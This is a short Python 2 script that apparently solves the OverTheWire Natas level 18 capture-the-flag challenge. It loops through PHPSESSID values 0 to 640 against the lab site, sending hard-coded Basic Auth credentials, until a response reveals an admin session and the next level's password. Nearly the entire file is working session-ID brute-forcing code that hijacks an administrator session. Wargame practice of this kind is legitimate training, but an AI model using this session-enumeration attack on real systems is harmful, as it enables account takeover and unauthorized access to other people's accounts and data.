#!/usr/bin/python
import urllib
import urllib2



# 
def request_generate(URL, SESSID):
    req = urllib2.Request(URL)
    req.add_header('User-Agent',  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization', 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174; PHPSESSID={}'.format(SESSID))
    return urllib2.urlopen(req).read()


# main function
def main():
    URL = 'http://natas18.natas.labs.overthewire.org/index.php'
    for i in range(641):
        data = request_generate(URL, i)
        if data.find('You are an admin. The credentials for the next level are:')>0:
            print data
            exit(0)
        else:
            print "[*] Trying : ", i
    return


if __name__=='__main__':
    main()
